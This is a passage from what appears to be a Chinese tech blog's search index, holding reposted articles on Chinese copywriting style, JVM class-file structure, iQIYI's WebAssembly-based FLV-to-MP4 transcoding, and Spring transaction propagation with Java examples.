为什么？（例如：这款应用之所以被推荐，是由于它有哪些特色/亮点？）\n\n引言的语言文字务必要清晰、直观、简洁，通常字数需控制在 90 字左右。\n\n## 一些常用名词的正确用法\n\n- App / 应用（错误：APP、软件、程序）\n- Android（错误：android、安卓）\n- iOS（错误：ios、IOS）\n- iPhone（错误：IPHONE、iphone）\n- App Store（中间有空格，错误：AppStore、app store）\n- WiFi（错误：wifi、Wifi、Wi-fi）\n- email （错误：E-mail、Email）\n- 账号（错误：帐号，账户，帐户） [http://www.jianshu.com/p/baa85caede21] 苹果台湾用「帳號」，大陆用「账户」 谷歌用「帐户」，百度用「帐号」\n- 登陆（错误：登录）\n- P.S. （错误：PS、ps、Ps.）\n\n## 推荐阅读\n\n[余光中：怎样改进英式中文？——论中文的常态与变态](http://open.leancloud.cn/improve-chinese.html)\n\n## 感谢\n\n我们的写作和格式规范，基本上就是原文照搬了 LeanCloud 的[这篇文章](http://open.leancloud.cn/copywriting-style-guide.html)，LeanCloud 在这方面做得非常棒！在此表示感谢！\n","categories":["转载"],"tags":["DaoCloud","文案风格","写作规范","格式规范"]},{"title":"class文件结构与格式——思维导图","url":"/repost/2020/jvm-class/","content":"\n## 前言\n\nclass文件作为操作系统无关的格式文件，是JVM直接识别的字节码文件。它可由java、scala、groovy等语言编译而来，校验后可在JVM中执行。下面我们一起看看class文件的结构与格式规范。\n\n### 1. class文件基本概念\n\n![class文件基本概念](https://up-img.yonghong.tech/pic/2020/07/12-21-24-watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTAwODYxMjI=,size_16,color_FFFFFF,t_70-g7ARYc.jpeg)\n<!--more-->\n\n### 2. class文件的结构\n\n![class文件的结构](https://up-img.yonghong.tech/pic/2020/07/12-21-24-watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTAwODYxMjI=,size_16,color_FFFFFF,t_70-20200712212433688-RIThe9.jpeg)\n\n##### PS：符号引用的概念\n\n![符号引用的概念](https://up-img.yonghong.tech/pic/2020/07/12-21-24-watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTAwODYxMjI=,size_16,color_FFFFFF,t_70-20200712212433934-Iy6K1B.jpeg)\n\n### 3. 字节码指令\n\n![字节码指令](https://up-img.yonghong.tech/pic/2020/07/12-21-24-watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTAwODYxMjI=,size_16,color_FFFFFF,t_70-20200712212434852-20vwxN.jpeg)","categories":["转载"],"tags":["JVM","class"]},{"title":"LeanCloud 文案风格指南","url":"/repost/2020/leancloud-copywriting-style-guide/","content":"\n> 本文转载自 [LeanCloud 文案风格指南](https://open.leancloud.cn/copywriting-style-guide/)\n\n## 公司及产品名称\n\n我们的公司及产品名称是「LeanCloud」。注意这是两个单词的合成词，中间沒有空格（參考：GitHub）。如作为 URL 的一部分，应该使用全小写的「leancloud」。\n\n## 文案风格\n\n- 一定多检查，确保没有错别字。\n- 即使是流行语中故意的谐音错别字也不要使用，比如「墙裂」、「童鞋」等。\n- 我们崇尚精练的文风。请在检查中把对表达意思没有明显作用的字、词、句删除，在不影响表达效果的前提下把文案长度减到最短。\n\n<!-- more -->\n\n## 中文、英文、数字混合时空格的使用\n\n- 英文与非标点的中文之间需要有一个空格，如「使用 LeanCloud 开发移动应用」而不是「使用LeanCloud开发移动应用」。\n- 数字与非标点的中文之间需要有一个空格，如「我们发布了 5 个产品」而不是「我们发布了5个产品」。\n- 尽可能使用中文数词，特别是当前后都是中文时。上面的例子写为「我们发布了五个产品」会更好。\n- 数字与单位之间需要有一个空格，如「5 GB」而不是「5GB」。\n- 注意特殊名词的大小写：Android、iOS、iPhone、Google、Apple，无论是否在句首都应该以同样的方式写。\n- 在官方文案中尽量使用中文，避免中英文混合的情况。例如「app」一般应写为「应用」或「移动应用」。品牌、产品名、人名、地名等特殊名词，如果来自英文，请使用英文以避免在不同译法间选择。\n\n## 标点相关\n\n- 只有中文或中英文混排中，一律使用中文/全角标点。\n- 中英文混排中如果出现整句英文，则在这句英文中使用英文/半角标点。\n- 中文标点与其他字符间一律不加空格。\n- 中文文案中使用中文引号「」和『』，其中「」为外层引号。Mac 上如「百度输入法」等都可以方便地输入中文引号。\n\n## 段落\n\n- 如果是纯文本，段落之间使用一个空行隔开。如果是 HTML 或其他富文本格式，使用额外空白作为段落间的分隔。\n- 段落开头不要留出空白字符。\n\n## 对第三方内容的引用\n\n- 如果在正文中部分引用第三方内容，请使用恰当的引用格式并给出出处。如：\n\n  > One man's constant is another man's variable.\n  > — Alan Perlis\n\n- 如果是全篇转载，请在全文开头显著位置注明出处并链接至原文，如：\n\n  > 本文转载自 [WikiQuote](http://en.wikiquote.org/wiki/Alan_Perlis)\n\n- 如果格式不允许超链接，请以文本方式直接给出原文链接。如果原文链接太长影响美观，可以使用短链接服务。如：\n\n  > 本文转载自 WikiQuote：`http://bit.ly/UlHIdN`\n\n## 图片的使用\n\n- 图片加载缓慢，经常因为被屏蔽或者加载失败而不能正常显示，并且图片上的文字无法自动适应屏幕大小和分辨率，所以在线上媒介上不要将大段文字放在图片上。Logo 等需要使用特殊字体的局部文字除外。作为文章一部分的各级标题也应该使用通用字体和文本形态。\n\n## 一些具体用词\n\n- 「你」和「您」：在不是很正式或没有明确的个体指代对象的时候请用「你」，如文档、博客、群发的邮件等；在指代特定个体时请用「您」，如活动邀请函等。\n- 字体和字号的一致：在富文本格式文档中，特别是 HTML 邮件中，常有人因为从不同来源复制粘贴而导致同一层次的文本字体和字号不一致。这给人不专业的感觉，请避免。\n- [App](http://www.learnersdictionary.com/definition/app) 是 application 的缩写，发音为 /ˈæp/，在演讲等口头表达里要注意不要把三个字母拆开念。App 是一个普通名词而不是多个单词的首字母缩写，所以不应该用全大写的 APP。和其他词一样，大小写规则取决于是否处于句首、标题、或特殊短语（如 App Store）中。大多数情况下应该使用中文「应用」以避免这样的问题。\n- 不要称呼喜欢我们的用户为「粉丝」，而是使用「用户」。粉丝的说法显得不平等。而且很多人不喜欢这种称呼，因为它含有缺乏独立思考的意思。\n\n## 推荐阅读\n\n- [余光中：怎样改进英式中文？——论中文的常态与变态](https://open.leancloud.cn/improve-chinese/)\n- 「The Elements of Style」，虽然是讲英语，但很多对中文也适用。","categories":["文案风格"],"tags":["文案风格","写作规范","格式规范","LeanCloud"]},{"title":"爱奇艺直播 WebAssembly 优化之路","url":"/repost/2020/live-WebAssembly/","content":"\n## WebAssembly 技术简介\n\n近几年，WebAssembly 技术非常火，可以说是成为了 JavaScript 一个新的转折点。JavaScript 自 1995 年诞生之日起，其性能问题就被大家诟病。直到 2008 年，很多浏览器加入了即时编译器，JavaScript 也开始引入 JITs，再加上 Google 等厂商对其的大力优化，其性能提升了 10 倍不止。由此，JavaScript 也开始跳出了浏览器的范围，在各个领域崭露头脚，比如后台使用的 Node.js 和桌面端使用的 Electron 等。\n\nJIT 技术简而言之是在 JavaScript 解释执行时将常用的二进制代码块暂存下来，在下一次解释执行相同的代码块的时候可以直接运行暂存的二进制代码块，节约了解释的时间。那能不能将所有 JavaScript 代码一次性都编译成二进制，提升运行效率呢？WebAssembly 的出现回答了这个问题。\n\n在 WebAssembly 出现之前，JavaScript 是浏览器里可以运行的唯一的编程语言。而 WebAssembly 技术使浏览器运行别的语言编写的程序变成了可能。目前可以使用 C、C++、Rust、Go、Java、C# 编译器（还有更多）来创建 wasm 模块。浏览器在运行时将 wasm 模块放在专有的虚拟机中运行。由于是二进制的文件，运行效率比解释执行的 JavaScript 脚本要高很多，因此，很多前端开发者也把 WebAssembly 技术视作下一代的前端技术。\n\n目前 WebAssembly 的兼容性如下图所示：\n\n<!--more-->\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-5963ff768bcf49e76cf779db582fdc94-L4PL0t.png)\n\n可以看到，在新版本上，主流浏览器不管是在 PC 端还是移动端都支持了 WebAssembly，而且各大浏览器厂商还在持续支持此项技术，相信不久就会得到非常普遍的应用。\n\n## WebAssembly 和直播，不一样的火花\n\n一直以来，爱奇艺生产的直播流有 mp4 和 flv 两种格式，但 Html5 的 video 标签原生只支持 mp4 的播放，如何解决 flv 格式在网页端播放的问题就摆在了所有人的面前。一般来说 flv 格式在网页端播放有以下几种解决方案：\n\n**1、使用 flash 播放器插件**\n\n不过因为性能和安全等各种问题，各大浏览器已经逐渐弱化了这种方式，Chrome 也将在 2020 年左右停止对 flash player 的支持，所以现在基本很少有人用了。\n\n**2、网页对 flv 格式的视频解码**\n\n使用 canvas 渲染图像，使用 audio 播放声音，相当于网页端做一个播放器，这也是可行的。但各大浏览器厂商对原生 video 控件会针对不同的平台做硬件加速渲染的优化，如果自己渲染的话，硬件加速这块便也需要自己做，这样会耗费极大的人力，并且效果也很难和浏览器原生的硬件加速相比。\n\n**3、在网页端将 flv 格式转成 mp4 格式然后使用原生播放器**\n\n这也是目前使用得最多的方案。这样既可以播放 flv 的直播流，也可以将渲染丢给原生播放器去做，充分发挥原生播放器的优化能力。\n\n爱奇艺直播使用的就是第三种方式，当 flv 的直播流到达前端时，使用 JavaScript 将 flv 转换成 mp4，再交给原生播放器。但由于 JavaScript 运行效率较低，这部分的性能一直都令人不太满意，所以决定引入 WebAssembly 技术，看看是否能带来不一样的提升。现在打开任意的爱奇艺直播间，在后面输入 __enablewasm__=true，就能打开 WebAssembly 转码模式，如下图所示：\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-b3ca2ddccc47784ef6ac973131e3e070-Hk2a6X.png)\n\n体验上，两种模式都能满足流畅观看直播的需求。由此可见，WebAssembly 模块可以很完美地替换原来的 JavaScript 所写的转码模块。下面来看一下如何接入 WebAssembly。\n\n## 接入 WebAssembly 的步骤\n\n使用 WebAssembly 非常简单，总的来说，分为以下几步：\n\n**1、使用 c 编写 flv 转 mp4 的代码**\n\n首先定义 WebAssembly 被 js 调用的接口文件：\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-4bfde2b37f431818c42ad4a454405b45-tEikjQ.png)\n\n如果想在被编译成 wasm 文件后可以被 JavaScript 调用，就需要在可以被外部调用的函数前使用 EM_PORT_API 来标识，这样在后面编译的时候 WebAssembly 就会将此函数作为可被 JavaScript 调用的方法抛出。\n\n然后还需定义一些 WebAssembly 调用 JavaScript 的接口，如下面所示：\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-c2a9e99fd9f257008cd0e95077a3c3e3-0llF3W.png)\n\n主要是通知 js 转换 mp4 流的头部信息和已经转好的部分流的缓存区地址等，实际调用的代码需要使用 EM_ASM_() 函数包起来，里面填上调用的 JavaScript 方法名和带的参数。\n\n定义好接口后就是转码实现的部分了，这里涉及到 flv 和 mp4 格式的相关知识（对这两种格式不太了解的同学可以自行阅读相关文档）。整体转码采用 flv 和 mp4 双缓存区的模式，流程如下图所示：\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-d988c2a90f6888a8511f7d879709b6a3-Ongn5R.png)\n\na. JavaScript 获取到直播流后将流存入 flv 缓存区；\n\nb. JavaScript 通知 WebAssembly 缓存区首地址和进度；\n\nc. WebAssembly 请求缓存区数据；\n\nd. WebAssembly 进行转码；\n\ne. 将转好的 mp4 片段存入 mp4 缓存区；\n\nf. WebAssembly 通知 JavaScript 转码进度；\n\n最后由 JavaScript 通知原生播放器直接播放 mp4 缓存区的视频流。\n\n**2、使用 emcc 编译出 flv2Mp4.js 和 flv2Mp4.wasm**\n\n首先需要安装 emscripten 环境，安装和配置的具体步骤可以参考 emscripten 的[官网](https://emscripten.org/)。\n\n安装完成后就可以使用emcc 命令编译c 文件了，使用命令 emcc main.c -s TOTAL_MEMORY=268435456 -g -o flvToMp4.js，最终可以得到两个文件，flvToMp4.js 和flvToMp4.wasm。\n\n其中flvToMp4.wasm 是实际转码的code，flvToMp4.js 相当于接口文件，播放器可以通过引入flvToMp4.js 来加载wasm 文件和调用wasm 文件中的二进制代码。\n\n通过阅读flvToMp4.js，我们可以发现自动生成初始化WebAssembly 的相关代码，获取WebAssembly 的二进制文件后，调用了WebAssembly.instantiate()，初始化了WebAssembly，并且在获取或加载wasm 文件失败后还能再次重试。\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-8c39550cbb1ab8375878aa9956f936ff-BYl4gv.png)\n\n通过查看getBinaryPromise() 方法也可以看到下载的过程。\n\n\n\n使用自动生成的代码，就基本可以不用管加载wasm 文件等问题，非常方便。\n\n**3、对接编译好的 wasm 文件**\n\n因为转码是高 cpu 的工作，所以将其放入 web_worker 中运行，这样不会阻碍主线程的渲染。\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-4e85e4a7eb56b77bef508d0771045ad3-7Y6cBL.png)\n\nworker 创建后将事件和主线程对应绑定，也即绑定前面定义的 wasm 调用 JavaScript 的几个方法：\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-2161d4a1bb0259911194193d671f50aa-Ewh2We.png)\n\n上面就是 WebAssembly 通知 JavaScript 的相关消息接口的定义，到此已经完成了整个转码过程的全部接口定义，全部流程就如下面的时序图所展示。\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-10ce45621b62b9db618bbac96c480e2a-9cWZh7.png)\n\n由时序图可以看到播放器在收到流时就会初始化 WebAssembly 模块，初始化完成后进入转码阶段，通知 WebAssembly 进行转码并存入缓存区，再通知播放器播放。\n\n## 使用 WebAssembly 实际性能对比\n\n体验上能保持一致，那实际性能上有多少提升呢？还是要用数据说话。爱奇艺直播团队先后使用代码打点和浏览器自带的性能监测工具实时监测数据的方式来测试 WebAssembly 的实际使用性能。\n\n**1、直播流转码效率情况**\n\n首先，测试使用 WebAssembly 实际转码的速度。分别使用原来 JavaScript 所开发的转码模块和使用 WebAssembly 的转码模块进行转换，在实际直播间转换 flv 流数据包的前后进行打点计时，最终得到的数据如下所示：\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-33b4773fb18b449a019c2e51dd8992e8-FEHKAa.png)\n\n前后各挑取了 30 包 flv 数据，表中第二列是每一包转码耗时，第三列是包的大小，在表的最后统计了总包的大小和总耗时，由此计算出未开启 WebAssembly 和开启 WebAssembly 的平均传输速率分别为 35305.6 字节 /s 和 46608.1 字节 /s。可以看出，WebAssembly 开启后转码速度的提升还是非常明显的。\n\n**2、运行时浏览器资源消耗情况**\n\nWebAssembly 实际应用在直播间中，能给直播间带来什么样的提升呢？最明显的是 cpu 占用率的下降。这一点可以通过使用 Chrome 浏览器自带的 Performance monitor 对使用 WebAssembly 前后的资源消耗做对比来证明。\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-e0878c89249cb60aa710756f3a04cbc6-cP8EkF.png)\n\n如上图所示，可以在开发者工具 More tools 中找到 Performance monitor。通过这个工具，可以大概得到平时运行时的 cpu 占用率。下面两张图分别显示稳定播放时未开启 WebAssembly 和开启 WebAssembly 的 cpu 占用率情况：\n\n- **未开启 WebAssembly**：\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-6c114b0987735353906bcb5af7e9480b-2kzUWt.png)\n\n- **开启 WebAssembly**：\n\n![爱奇艺直播WebAssembly优化之路](https://up-img.yonghong.tech/pic/2020/07/28-17-57-d694268ff2a13225c8ce3c1c186bd127-FKfVfE.png)\n\n从图中可以大致看到，未开启 WebAssembly 时，cpu 占用率基本稳定在 7% 左右，而开启 WebAssembly 之后，cpu 占用率能稳定在 5% 上下，由此可以估算出大约有 10%-20% 的提升 (注：使用测试机型为 macbookpro 2018 款，cpu i7 2.2 GHz，不同机器测试出的性能可能有差别，波动状况也不完全一致，但在不同平台开启 WebAssembly 基本都能获得不同程度性能的提升)。\n\n## WebAssembly 未来的更多可能\n\n使用 WebAssembly 转码还只是 WebAssembly 的一个非常小的用处，爱奇艺直播团队还将使用 WebAssembly 技术实现更多有趣、有价值的功能，比如：\n\n- **c++ 项目的移植**。现在很多图像相关的项目、算法都是由 c++ 编写的，如果想在浏览器上运行，以前就只能使用 JavaScript 重写一遍；而现在，通过 WebAssembly，只需要极小的改动，就使其能在浏览器上跑起来。\n- **算法的加密**。由于 WebAssembly 编译成的 wasm 是二进制文件，反编译的成本很高，部分保密性比较强的算法会使用 WebAssembly 技术。\n- **H.265 编码格式的支持**。H.265 编码方式凭借其出色的压缩比，被越来越多的产品所应用，但目前各主流浏览器原生还不支持 H.265 的硬解。但是也可以根据同样的思路，使用 WebAssembly 将 H.265 的流转化为 H.264 的流，然后再使用原生播放器播放，最终达到 Web 端播放 H.265 流的效果，这样可以极大地降低带宽成本。\n\n得益于性能上的提升，WebAssembly 开始在各个领域崭露头脚，今后，爱奇艺直播团队也将尝试使用 WebAsssembly 实现更多的功能来优化爱奇艺的直播体验。\n\n**本文转载自公众号爱奇艺技术产品团队（ID：iQIYI-TP）**。\n\n**原文链接**：\n\n**https://mp.weixin.qq.com/s/LRGNOuFwHXALs_lhPyN3Zw**","categories":["转载"],"tags":["WebAssembly"]},{"title":"Spring事务的传播特性","url":"/repost/2020/spring-transaction/","content":"\n> 原文链接：[Spring事务的传播特性](https://github.com/love-somnus/Spring/wiki/Spring事务的传播特性)\n\nSpring 事务一个被讹传很广说法是：一个事务方法不应该调用另一个事务方法，否则将产生两个事务。结果造成开发人员在设计事务方法时束手束脚，生怕一不小心就踩到地雷。\n\n其实这种是不认识 Spring 事务传播机制而造成的误解，Spring 对事务控制的支持统一在 `TransactionDefinition` 接口中描述，该接口有以下几个重要的接口方法：\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-20181230001-dfRHHu.png)\n\n<!--more-->\n\n很明显，除了事务的传播行为外，事务的其它特性 Spring 是借助底层资源的功能来完成的，Spring 无非只充当个代理的角色。但是事务的传播行为却是 Spring 凭借自身的框架提供的功能，是 Spring 提供给开发者最珍贵的礼物，讹传的说法玷污了 Spring 事务框架最美丽的光环。\n\n所谓事务传播行为就是多个事务方法相互调用时，事务如何在这些方法间传播。Spring 支持 7 种事务传播行为（Transaction Propagation Behavior）：\n\n| 传播行为                      | 描述                                                         |\n| ----------------------------- | ------------------------------------------------------------ |\n| **PROPAGATION_REQUIRED**      | 如果没有，就开启一个事务；如果有，就加入当前事务（方法B看到自己已经运行在 方法A的事务内部，就不再起新的事务，直接加入方法A） |\n| **RROPAGATION_REQUIRES_NEW**  | 如果没有，就开启一个事务；如果有，就将当前事务挂起。（方法A所在的事务就会挂起，方法B会起一个新的事务，等待方法B的事务完成以后，方法A才继续执行） |\n| **PROPAGATION_NESTED**        | 如果没有，就开启一个事务；如果有，就在当前事务中嵌套其他事务 |\n| **PROPAGATION_SUPPORTS**      | 如果没有，就以非事务方式执行；如果有，就加入当前事务（方法B看到自己已经运行在 方法A的事务内部，就不再起新的事务，直接加入方法A） |\n| **PROPAGATION_NOT_SUPPORTED** | 如果没有，就以非事务方式执行；如果有，就将当前事务挂起，（方法A所在的事务就会挂起，而方法B以非事务的状态运行完，再继续方法A的事务） |\n| **PROPAGATION_NEVER**         | 如果没有，就以非事务方式执行；如果有，就抛出异常。           |\n| **PROPAGATION_MANDATORY**     | 如果没有，就抛出异常；如果有，就使用当前事务                 |\n\n------\n\n其中**前4种**是开发中用到概率比较大的，建议熟记；**后面3种**不常用，了解就行。\n\n我们经常会提到，方法A传播到方法B，那到底是A调用B，还是B调用A，这个问题我一开始学Spring的时候犯浑过，搞反了，导致久久理解不了。其实只要仔细斟酌字面意思就不会像我那样犯傻了。\n\nA传播到B，显而易见进入A方法执行半途中，再次进入B方法，这才叫做传播到方法B中。\n\n还有一点初学者不要搞错的是，这里的方法A和方法B理论上不应该在一个Service中，而是在不同的Service中，这里面有个坑我们会在后面介绍。\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-20181230003-679LqZ.png)\n\n我们的例子使用的是`@Transactional`注解，默认使用REQUIRED传播行为。\n\n假设事务从方法 A 传播到方法 B。\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-2018123001-vUXmD7.png)\n\n我们现在面对方法B，其中B会抛出异常。\n\n```java\n@Service\npublic class UserService01 {\n\n    @Autowired\n    private UserDao userDao;\n    @Autowired\n    private LogService01 logService;\n    \n    @Transactional\n    public void A() {\n        userDao.insert(new User(\"admin\",\"123456\"));\n        logService.B();\n    }\n}\n\n@Service\nclass LogService01 {\n\n    @Autowired\n    private LogDao logDao;\n    \n    @Transactional\n    public void B() {\n        logDao.insert(new Log(\"abcdefghijklmn\",\"192.168.1.1\"));\n        System.out.println(1/0);\n    }\n}\n// 方法A和方法B都不会保存数据成功 \n```\n\n我们现在面对方法B，其中A会抛出异常。\n\n```java\n@Service\npublic class UserService02 {\n\n    @Autowired\n    private UserDao userDao;\n    @Autowired\n    private LogService02 logService;\n    \n    @Transactional\n    public void A() {\n        userDao.insert(new User(\"admin\",\"123456\"));\n        logService.B();\n        System.out.println(1/0);\n    }\n}\n\n@Service\nclass LogService02 {\n\n    @Autowired\n    private LogDao logDao;\n    \n    @Transactional\n    public void B() {\n        logDao.insert(new Log(\"abcdefghijklmn\",\"192.168.1.1\"));\n    }\n}\n// 方法A和方法B都不会保存数据成功 \n```\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-2018123002-68a3Ks.png)\n\n我们现在面对方法B，其中B会抛出异常。\n\n```java\n@Service\npublic class UserService03 {\n\n    @Autowired\n    private UserDao userDao;\n    @Autowired\n    private LogService03 logService;\n    \n    public void A() {\n        userDao.insert(new User(\"admin\",\"123456\"));\n        logService.B();\n    }\n}\n\n@Service\nclass LogService03 {\n\n    @Autowired\n    private LogDao logDao;\n\n    @Transactional\n    public void B() {\n        logDao.insert(new Log(\"abcdefghijklmn\",\"192.168.1.1\"));\n        System.out.println(1/0);\n    }\n}\n// 方法A中的数据保存成功，方法B中的数据保存失败\n```\n\n我们现在面对方法B，其中A会抛出异常。\n\n```java\n@Service\npublic class UserService04 {\n\n    @Autowired\n    private UserDao userDao;\n    @Autowired\n    private LogService04 logService;\n    \n    public void A() {\n        userDao.insert(new User(\"admin\",\"123456\"));\n        logService.B();\n        System.out.println(1/0);\n    }\n}\n\n@Service\nclass LogService04 {\n\n    @Autowired\n    private LogDao logDao;\n    \n    @Transactional\n    public void B() {\n        logDao.insert(new Log(\"abcdefghijklmn\",\"192.168.1.1\"));\n    }\n}\n// 方法A中的数据保存成功，方法B中的数据保存成功\n```\n\n**如果没有，就开启一个事务**(方法B运行的时候发现自己没有在事务中，它就会为自己分配一个事务)；**如果有，就加入当前事务**。（方法B看到自己已经运行在 方法A的事务内部，就不再起新的事务，直接加入方法A）。这就是 **`PROPAGATION_REQUIRED`**，它也是 Spring 提供的默认事务传播行为，适合绝大多数情况。\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-20181230004-QunABz.png)\n\n假设事务从方法 A 传播到方法 B。\n\n![img](https://github.com/love-somnus/interview/wiki/2018123001.png)\n\n**我们现在面对方法B，其中B会抛出异常。**\n\n```java\n@Service\npublic class UserService11 {\n\n    @Autowired\n    private UserDao userDao;\n    @Autowired\n    private LogService11 logService;\n\n    @Transactional\n    public void A() {\n        userDao.insert(new User(\"admin\",\"123456\"));\n        logService.B();\n    }\n}\n\n@Service\nclass LogService11 {\n\n    @Autowired\n    private LogDao logDao;\n\n    @Transactional(propagation=Propagation.REQUIRES_NEW)\n    public void B() {\n        logDao.insert(new Log(\"abcdefghijklmn\",\"192.168.1.1\"));\n        System.out.println(1/0);\n    }\n}\n// 方法A中的数据保存失败，方法B中的数据保存失败\n\n@Service\npublic class UserService11_ {\n    @Autowired\n    private UserDao userDao;\n    @Autowired\n    private LogService11_ logService;\n\n    @Transactional(noRollbackFor=ArithmeticException.class)\n    public void A() {\n        userDao.insert(new User(\"admin\",\"123456\"));\n        logService.B();\n    }\n}\n\n@Service\nclass LogService11_ {\n\n    @Autowired\n    private LogDao logDao;\n\n    @Transactional(propagation=Propagation.REQUIRES_NEW)\n    public void B() {\n        logDao.insert(new Log(\"abcdefghijklmn\",\"192.168.1.1\"));\n        System.out.println(1/0);\n    }\n}\n// 方法A中的数据保存成功，方法B中的数据保存失败\n```\n\n**我们现在面对方法B，其中A会抛出异常**。\n\n```java\n@Service\npublic class UserService12 {\n\n    @Autowired\n    private UserDao userDao;\n    @Autowired\n    private LogService12 logService;\n    \n    @Transactional\n    public void A() {\n        userDao.insert(new User(\"admin\",\"123456\"));\n        logService.B();\n        System.out.println(1/0);\n    }\n}\n\n@Service\nclass LogService12 {\n\n    @Autowired\n    private LogDao logDao;\n\n    @Transactional(propagation=Propagation.REQUIRES_NEW)\n    public void B() {\n        logDao.insert(new Log(\"abcdefghijklmn\",\"192.168.1.1\"));\n    }\n}\n// 方法A中的数据保存失败，方法B中的数据保存成功\n```\n\n![img](https://github.com/love-somnus/interview/wiki/2018123002.png)\n\n例子可以参考**PROPAGATION_REQUIRED**，它们都是如果A没有事务，B就为自己分配一个事务。\n\n**如果没有，就开启一个事务**(方法B运行的时候发现自己没有在事务中，它就会为自己分配一个事务)；**如果有，就将当前事务挂起**。（方法A所在的事务就会挂起，方法B会起一个新的事务，等待方法B的事务完成以后，方法A才继续执行）。这就是 `RROPAGATION_REQUIRES_NEW`，意思就是创建了一个新事务，它和原来的事务没有任何关系了。\n\n`RROPAGATION_REQUIRES_NEW`与 **`PROPAGATION_REQUIRED`** 的事务区别在于事务的回滚程度了。因为 方法B是新起一个事务，那么就是存在两个不同的事务。\n\n1. 如果方法B已经提交，那么 方法A失败回滚，方法B是不会回滚的。\n2. 如果方法B失败回滚，如果它抛出的异常被方法A捕获，方法A的事务仍然可能提交（主要看方法B抛出的异常是不是方法A会回滚的异常）\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-20181230005-q9rkPU.png)\n\n**如果没有，就开启一个事务(方法B运行的时候发现自己没有在事务中，它就会为自己分配一个事务)；如果有，就在当前事务中嵌套其他事务。**这就是PROPAGATION_NESTED，也就是传说中的“嵌套事务”了，所嵌套的子事务与主事务之间是有关联的（当主事务提交或回滚，子事务也会提交或回滚）。方法A所在的事务就会挂起，方法B会起一个新的子事务并设置savepoint，等待方法B的事务完成以后，方法A才继续执行。因为方法B是外部事务的子事务，那么\n\n1. 如果方法B已经提交，那么方法A失败回滚，方法B也将回滚。（REQUIRES_NEW中此种情况方法B是不会回滚的，因为方法B是独立事务，提交就是提交了）\n2. 如果方法B失败回滚，如果它抛出的异常被方法A捕获，方法A的事务仍然可能提交（主要看方法B抛出的异常是不是方法A会回滚的异常）\n\n理解**NESTED**的关键是**savepoint**。他与**REQUIRES_NEW**的区别是： **REQUIRES_NEW**完全是一个新的事务,它与外部事务相互独立； 而 **NESTED** 则是外部事务的子事务, 如果外部事务commit, 嵌套事务也会被**commit**, 这个规则同样适用于**roll back**\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-20181230006-X277O5.png)\n\n**如果没有，就以非事务方式执行**（如果发现方法A没有开启事务，则方法B也不开启事务）；**如果有，就加入当前事务。**（方法B看到自己已经运行在方法A的事务内部，就不再起新的事务，直接加入方法A）。这就是 **PROPAGATION_SUPPORTS**，这种方式非常随意，没有就没有，有就有，有点无所谓的态度，反正我是支持你的。\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-20181230007-PgZlzQ.png)\n\n**如果没有，就以非事务方式执行**（如果发现方法A没有开启事务，则方法B也不开启事务）；**如果有，就将当前事务挂起**。（方法A的事务挂起，而方法B非事务的状态运行完，再继续方法A的事务。）这就是 **PROPAGATION_NOT_SUPPORTED**，这种方式非常强硬，没有就没有，有我也不支持你，把你挂起来，不鸟你。\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-20181230008-wZZUsp.png)\n\n**如果没有，就以非事务方式执行**（如果发现方法A没有开启事务，则方法B也不开启事务）；**如果有，就抛出异常**（如果发现方法A有开启事务，则方法B直接抛出异常）。这就是 **PROPAGATION_NEVER**，这种方式更猛，没有就没有，有了反而报错，确实够牛的，它说：我从不支持事务！\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-20181230009-SZYqIs.png)\n\n如果没有，就抛出异常；如果有，就使用当前事务。这就是 **`PROPAGATION_MANDATORY`**，这种方式可以说是牛逼中的牛逼了，没有事务直接就报错，确实够狠的，它说：我必须要有事务！\n\n![img](https://up-img.yonghong.tech/pic/2020/06/10-11-19-20181230010-XCj0iS.png)\n\n需要注意的是 **`PROPAGATION_NESTED`**，不要被它的名字所欺骗，Nested（嵌套），所以凡是在类似方法 A 调用方法 B 的时候，在方法 B 上使用了这种事务传播行为，如果您真的那样做了，那您就错了。因为您错误地以为 **`PROPAGATION_NESTED`** 就是为方法嵌套调用而准备的，其实默认的 **`PROPAGATION_REQUIRED`** 就可以帮助您，做您想要做的事情了。\n\nSpring 给我们带来了事务传播行为，这确实是一个非常强大而又实用的功能。除此以外，也提供了一些小的附加功能，比如：\n\n1. **事务超时（Transaction Timeout）**：为了解决事务时间太长，消耗太多的资源，所以故意给事务设置一个最大时常，如果超过了，就回滚事务。\n2. **只读事务（Readonly 